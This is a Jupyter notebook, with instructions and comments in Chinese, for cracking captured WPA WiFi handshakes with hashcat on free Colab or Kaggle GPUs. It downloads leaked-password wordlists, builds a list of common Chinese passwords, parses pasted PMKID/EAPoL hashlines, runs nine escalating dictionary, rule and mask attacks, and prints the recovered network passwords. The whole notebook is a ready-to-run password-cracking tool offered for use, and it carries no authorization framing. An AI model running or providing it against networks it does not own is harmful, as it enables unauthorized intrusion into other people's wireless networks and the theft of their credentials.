# WiFi握手包GPU破解 v3.0 - Kaggle / Google Colab 双平台

**支持平台**: Google Colab (推荐) + Kaggle Notebook

**使用方法**:
1. 在 Colab/Kaggle 中开启 **GPU加速器**（Runtime → Change runtime type → GPU）
2. 运行前两个Cell安装hashcat和下载字典
3. 在第3个Cell的 `RAW_PASTE` 中**直接粘贴hashline**
4. 运行后续Cell开始破解

**字典规模**: wpa-sec(75万) + 中国定制(150万+) + Probable(20万) + SecLists(1000万+)

| GPU | WPA速度 | 8位数字 |
|-----|---------|--------|
| Colab T4 | ~80K H/s | ~20分钟 |
| Colab A100 | ~500K+ H/s | ~3分钟 |
| Kaggle P100 | ~120K H/s | ~14分钟 |

## 1. 环境准备（自动检测 Colab / Kaggle）

In [ ]:
# ============================================================================
# 自动检测平台 + GPU检测 + hashcat安装
# Colab: apt install hashcat（网络通畅）
# Kaggle: 源码编译（apt被阻塞）
# ============================================================================
import os, subprocess, sys

# ── 检测运行平台 ──
IS_COLAB = False
IS_KAGGLE = False
try:
    import google.colab
    IS_COLAB = True
except ImportError:
    pass
if os.path.exists('/kaggle'):
    IS_KAGGLE = True

PLATFORM = 'Colab' if IS_COLAB else ('Kaggle' if IS_KAGGLE else 'Unknown')
WORK_DIR = '/content' if IS_COLAB else '/kaggle/working'
os.makedirs(WORK_DIR, exist_ok=True)

print(f'平台: {PLATFORM}')
print(f'工作目录: {WORK_DIR}')
print()

# ── GPU检测 ──
!nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null || echo "[!] GPU不可用，请开启GPU加速器"
print()

In [ ]:
# ============================================================================
# hashcat安装（Colab用apt，Kaggle用源码编译）
# ============================================================================
import shutil

HASHCAT_BIN = shutil.which('hashcat') or ''

if HASHCAT_BIN:
    print(f'hashcat已安装: {HASHCAT_BIN}')
    !{HASHCAT_BIN} --version
elif IS_COLAB:
    # Colab网络通畅，直接apt安装
    print('Colab: apt安装hashcat...')
    !apt-get update -qq && apt-get install -y -qq hashcat 2>&1 | tail -3
    HASHCAT_BIN = shutil.which('hashcat') or 'hashcat'
    !{HASHCAT_BIN} --version
else:
    # Kaggle: apt网络被阻塞，用源码编译
    HC_DIR = os.path.join(WORK_DIR, 'hc')
    HC_BIN = os.path.join(HC_DIR, 'hashcat')
    if os.path.exists(HC_BIN):
        HASHCAT_BIN = HC_BIN
        print(f'使用已编译的hashcat')
    else:
        print('Kaggle: 源码编译hashcat（约60秒）...')
        !git clone --depth=1 https://github.com/hashcat/hashcat.git {HC_DIR} 2>&1 | tail -2
        !cd {HC_DIR} && make -j4 2>&1 | tail -3
        if os.path.exists(HC_BIN):
            HASHCAT_BIN = HC_BIN
        else:
            print('[!] 编译失败，请在控制台手动运行:')
            print(f'  !git clone --depth=1 https://github.com/hashcat/hashcat.git {HC_DIR} && cd {HC_DIR} && make -j4')
            HASHCAT_BIN = HC_BIN
    !{HASHCAT_BIN} --version 2>/dev/null || echo "hashcat未就绪"

# 检测GPU设备
print()
!{HASHCAT_BIN} -I 2>/dev/null | grep -E "Device|Name" | head -4 || echo "未检测到GPU设备"
print(f'\nhashcat: {HASHCAT_BIN}')

## 2. 下载字典 + 生成中国定制密码

In [ ]:
# ============================================================================
# 下载字典 + 生成中国定制密码（兼容Colab和Kaggle）
# ============================================================================
import glob, time, re

DICT_DIR = os.path.join(WORK_DIR, 'dicts')
os.makedirs(DICT_DIR, exist_ok=True)

def download_dict(url, save_path, desc):
    if os.path.exists(save_path) and os.path.getsize(save_path) > 100:
        lines = int(subprocess.getoutput(f'wc -l < {save_path}').strip() or 0)
        print(f'  [已存在] {desc}: {lines:,} 条')
        return True
    print(f'  [下载中] {desc}...')
    try:
        if url.endswith('.gz'):
            tmp = save_path + '.gz'
            subprocess.run(['wget','-q','--timeout=30',url,'-O',tmp], timeout=120)
            subprocess.run(['gunzip','-f',tmp], capture_output=True)
        else:
            subprocess.run(['wget','-q','--timeout=60',url,'-O',save_path], timeout=300)
        if os.path.exists(save_path) and os.path.getsize(save_path) > 100:
            lines = int(subprocess.getoutput(f'wc -l < {save_path}').strip() or 0)
            print(f'  [完成] {desc}: {lines:,} 条')
            return True
    except Exception as e:
        print(f'  [失败] {desc}: {e}')
    return False

DICT_WPASEC = os.path.join(DICT_DIR, 'wpa-sec-cracked.txt')
download_dict('https://wpa-sec.stanev.org/dict/cracked.txt.gz', DICT_WPASEC, 'wpa-sec(~75万)')

DICT_PROBABLE = os.path.join(DICT_DIR, 'probable-wpa.txt')
download_dict('https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top204Thousand-WPA-probable-v2.txt', DICT_PROBABLE, 'Probable WPA(~20万)')

DICT_SECLISTS = os.path.join(DICT_DIR, 'seclists-10k.txt')
download_dict('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt', DICT_SECLISTS, 'SecLists 10K')

DICT_XATO = os.path.join(DICT_DIR, 'xato-10m.txt')
download_dict('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords.txt', DICT_XATO, 'xato 10M')

# ── 中国定制字典 ──
DICT_CHINA = os.path.join(DICT_DIR, 'china-wifi.txt')
def gen_china(path):
    seen = set(); count = [0]
    with open(path, 'w') as f:
        def a(s):
            if len(s)>=8 and s not in seen: seen.add(s); f.write(s+'\n'); count[0]+=1
        for d in '0123456789': a(d*8); a(d*9)
        for s in range(10):
            a(''.join(str((s+i)%10) for i in range(8)))
            a(''.join(str((s-i)%10) for i in range(8)))
        for x in range(10):
            for y in range(10):
                for z in range(10):
                    for w in range(10): a(f'{x}{x}{y}{y}{z}{z}{w}{w}')
        for n in range(10000): s=f'{n:04d}'; a(s+s); a(s+s[::-1])
        for y in range(1960,2012):
            for m in range(1,13):
                for d in range(1,32):
                    if m in(4,6,9,11)and d>30:continue
                    if m==2 and d>29:continue
                    a(f'{y:04d}{m:02d}{d:02d}'); a(f'{m:02d}{d:02d}{y:04d}')
        for i in range(100000): a(f'520{i:05d}'); a(f'{i:05d}520')
        for i in range(10000): a(f'1314{i:04d}'); a(f'{i:04d}1314')
        for py in['woaini','nihao','mima','baobei','laogong','laopo','wechat','weixin','taobao','jiayou','xingfu','xiaoming','zhangwei']:
            for sx in['123','1234','12345','123456','12345678','888','666','520','1314','0000','9999']:
                a(py+sx); a(py.capitalize()+sx)
        for c in'abcdefghijklmnopqrstuvwxyz':
            for nm in['1234567','12345678','123456789','11111111','88888888','00000000']:
                a(c+nm); a(nm+c)
        for c1 in'abcdefghijklmnopqrstuvwxyz':
            for c2 in'abcdefghijklmnopqrstuvwxyz':
                for nm in['123456','1234567','888888','666666']: a(c1+c2+nm)
        p4=['0000','1111','2222','3333','4444','5555','6666','7777','8888','9999','1234','5678','1314','0520']
        for p1 in p4:
            for p2 in p4: a(p1+p2)
            for n in range(10000): a(p1+f'{n:04d}')
    return count[0]

if os.path.exists(DICT_CHINA) and os.path.getsize(DICT_CHINA)>1000:
    print(f'  [已存在] 中国定制: {int(subprocess.getoutput(f"wc -l < {DICT_CHINA}").strip() or 0):,} 条')
else:
    print('  [生成] 中国定制字典...')
    print(f'  [完成] {gen_china(DICT_CHINA):,} 条')

# ── 汇总 ──
print()
all_dicts = []
for name, path in [('wpa-sec',DICT_WPASEC),('中国定制',DICT_CHINA),('Probable',DICT_PROBABLE),('SecLists',DICT_SECLISTS),('xato',DICT_XATO)]:
    if os.path.exists(path) and os.path.getsize(path)>100:
        lines=int(subprocess.getoutput(f'wc -l < {path}').strip() or 0)
        print(f'  {name:12s} {lines:>10,} 条')
        all_dicts.append(path)
print(f'  字典: {len(all_dicts)} 个')

## 3. 粘贴握手包hashline（自动分割识别）

**直接在下方代码的 `RAW_PASTE` 变量中粘贴所有hashline**

支持的格式：
- 一次粘贴多条，每行一条
- 混合粘贴PMKID和EAPoL握手包
- 自动过滤空行、注释行、无效行
- 自动去重

**hashline格式示例**：
```
WPA*01*aabbccdd...*112233445566*aabbccddeeff*SSID的hex编码
WPA*02*aabbccdd...*112233445566*aabbccddeeff*SSID的hex编码*...
```

In [ ]:
# ============================================================================
# 握手包加载：直接粘贴hashline，自动分割识别
# ============================================================================

# ╔══════════════════════════════════════════════════════════════════╗
# ║  在下方三引号中直接粘贴所有hashline（一次粘贴多条）             ║
# ╚══════════════════════════════════════════════════════════════════╝
RAW_PASTE = """
在这里粘贴你的hashline，例如：
WPA*02*3a2d4499120ed27d25e3ddcf605578a3*5e33f725fd21*aabbccddeeff*69514f4f204e656f3130*0ccf364d1f8686bb5c0d817b7be943e22f2aefd6aff10bd572de7a0638dd121e*0103007702010a0000000000000000000108af162666d4ee6436c25d7de5a229ea190c74a00a75eb80473044f35a539a9500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001830160100000fac040100000fac040100000fac023c000000*00
"""

def parse_hashlines(raw_text):
    seen = set(); valid = []; inv = 0; dup = 0
    for line in re.split(r'[\r\n]+', raw_text):
        line = line.strip()
        if not line or line.startswith('#') or line.startswith('//') or line.startswith('在这里'): continue
        for seg in re.split(r'[\t ]+', line):
            seg = seg.strip()
            if not seg.startswith('WPA*'): continue
            parts = seg.split('*')
            if len(parts) < 6 or parts[1] not in ('01','02'): inv+=1; continue
            if seg in seen: dup+=1; continue
            seen.add(seg); valid.append(seg)
    return valid, inv, dup

hashlines, n_inv, n_dup = parse_hashlines(RAW_PASTE)

# 扫描Dataset中的.22000文件
ds_lines = []
for sd in (['/kaggle/input','/kaggle/working'] if IS_KAGGLE else ['/content']):
    for ext in ['*.22000','*.hc22000']:
        for fp in glob.glob(f'{sd}/**/{ext}', recursive=True):
            with open(fp) as f:
                for l in f:
                    l=l.strip()
                    if l.startswith('WPA*') and l not in set(hashlines): ds_lines.append(l)

all_hashlines = hashlines + ds_lines
ALL_HASHES = os.path.join(WORK_DIR, 'all_hashes.22000')
with open(ALL_HASHES, 'w') as out:
    for h in all_hashlines: out.write(h + '\n')

print(f'粘贴解析: {len(hashlines)} 条有效' + (f', {n_dup}重复' if n_dup else '') + (f', {n_inv}无效' if n_inv else ''))
if ds_lines: print(f'Dataset: {len(ds_lines)} 条')
print(f'合计: {len(all_hashlines)} 个握手包')
print()
for idx, h in enumerate(all_hashlines):
    p = h.split('*')
    if len(p) >= 6:
        t = 'PMKID' if p[1]=='01' else 'EAPoL'
        try: ssid = bytes.fromhex(p[5]).decode('utf-8', errors='replace')
        except: ssid = p[5][:24]
        mac = p[3]; bssid = ':'.join(mac[j:j+2] for j in range(0,12,2)) if len(mac)>=12 else mac
        print(f'  {idx+1}. {ssid} ({bssid}) [{t}]')

## 4. hashcat GPU批量破解（9轮递进攻击）

In [ ]:
# ============================================================================
# hashcat GPU批量破解：9轮递进攻击
# ============================================================================
OUTFILE = os.path.join(WORK_DIR, 'cracked_passwords.txt')
POTFILE = os.path.join(WORK_DIR, 'hashcat.potfile')
for f in [OUTFILE, POTFILE]:
    if os.path.exists(f): os.remove(f)

def run_hc(name, args, timeout_sec=7200):
    print(f'\n{"="*60}\n  {name}\n{"="*60}')
    cmd = [HASHCAT_BIN,'-m','22000',ALL_HASHES,'--potfile-path',POTFILE,
           '--outfile',OUTFILE,'--outfile-format','2','-w','3','-O','--quiet'] + args
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec)
        out = r.stdout + r.stderr
        elapsed = time.time() - t0
    except subprocess.TimeoutExpired:
        print(f'  [!] 超时({timeout_sec//60}分钟)'); return False
    except FileNotFoundError:
        print(f'  [!] hashcat未找到: {HASHCAT_BIN}'); return False
    for l in out.split('\n'):
        ls = l.strip()
        if any(k in ls for k in ['Speed','Recovered','Progress']): print(f'  {ls}')
    n = 0
    if os.path.exists(POTFILE):
        with open(POTFILE) as f: n = sum(1 for _ in f)
    if n > 0: print(f'  已破解: {n}/{len(all_hashlines)}')
    if r.returncode == 0 or 'All hashes found' in out:
        if n >= len(all_hashlines): return True
    return False

def merge_d(dl, out):
    seen = set()
    with open(out,'w') as f:
        for d in dl:
            if os.path.exists(d):
                for l in open(d):
                    l=l.strip()
                    if l and l not in seen: seen.add(l); f.write(l+'\n')
    return len(seen)

print(f'开始破解 {len(all_hashlines)} 个握手包 (hashcat: {HASHCAT_BIN})')
t0 = time.time(); done = False

# 攻击1-3: 字典
if not done and os.path.exists(DICT_WPASEC):
    done = run_hc('1/9: wpa-sec全球字典', ['-a','0',DICT_WPASEC])
if not done and os.path.exists(DICT_CHINA):
    done = run_hc('2/9: 中国定制字典', ['-a','0',DICT_CHINA])
if not done:
    extra = [d for d in [DICT_PROBABLE,DICT_SECLISTS,DICT_XATO] if os.path.exists(d)]
    if extra:
        mg = os.path.join(WORK_DIR,'merged.txt'); n=merge_d(extra,mg)
        done = run_hc(f'3/9: Probable+SecLists+xato({n:,}条)', ['-a','0',mg])

# 攻击4: 规则变异
if not done:
    am = os.path.join(WORK_DIR,'all_merged.txt'); merge_d(all_dicts,am)
    rule = ''
    for rp in ['/usr/share/hashcat/rules/best64.rule','/usr/local/share/hashcat/rules/best64.rule',
               os.path.join(WORK_DIR,'hc','rules','best64.rule')]:
        if os.path.exists(rp): rule=rp; break
    if rule: done = run_hc('4/9: 全字典+best64规则(×64倍)', ['-a','0',am,'-r',rule], 3600)

# 攻击5-9: 掩码
if not done: done = run_hc('5/9: 8位纯数字(1亿)', ['-a','3','?d?d?d?d?d?d?d?d'])
if not done:
    mf = os.path.join(WORK_DIR,'pfx.hcmask')
    with open(mf,'w') as f:
        for c in 'aqzwsxedcrfvtgbyhnujm': f.write(f'{c}?d?d?d?d?d?d?d\n')
    done = run_hc('6/9: 字母+7位数字', ['-a','3',mf], 3600)
if not done: done = run_hc('7/9: 9位纯数字(10亿)', ['-a','3','?d?d?d?d?d?d?d?d?d'], 14400)
if not done: done = run_hc('8/9: 手机号(1+10位)', ['-a','3','1?d?d?d?d?d?d?d?d?d?d'], 14400)
if not done: done = run_hc('9/9: 10位纯数字(100亿)', ['-a','3','?d?d?d?d?d?d?d?d?d?d'], 21600)

print(f'\n全部攻击完成，总耗时: {(time.time()-t0)/60:.1f}分钟')

## 5. 查看破解结果

In [ ]:
# ============================================================================
# 破解结果展示
# ============================================================================
print('='*60)
print('  破解结果')
print('='*60)

cracked = []
if os.path.exists(POTFILE):
    with open(POTFILE) as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                hp, pw = line.rsplit(':', 1)
                parts = hp.split('*')
                ssid = bssid = htype = ''
                if len(parts) >= 6:
                    htype = 'PMKID' if parts[1]=='01' else 'EAPoL'
                    try: ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
                    except: ssid = parts[5]
                    if len(parts[3])>=12:
                        bssid = ':'.join(parts[3][j:j+2] for j in range(0,12,2))
                cracked.append({'ssid':ssid,'password':pw,'bssid':bssid,'type':htype})

if cracked:
    print(f'\n  成功破解 {len(cracked)}/{len(all_hashlines)} 个!\n')
    for i, c in enumerate(cracked):
        print(f'  {i+1}. {c["ssid"]}: {c["password"]}  ({c["bssid"]}) [{c["type"]}]')
    print(f'\n  密码汇总:')
    for c in cracked:
        print(f'  {c["ssid"]}: {c["password"]}')
else:
    print('\n  未破解任何密码')
    print('  建议: 检查握手包完整性，或尝试更大字典')

# hashcat --show
print(f'\n{"="*60}')
r = subprocess.run([HASHCAT_BIN,'-m','22000',ALL_HASHES,'--potfile-path',POTFILE,'--show'],
                   capture_output=True, text=True, timeout=30)
if r.stdout: print(r.stdout)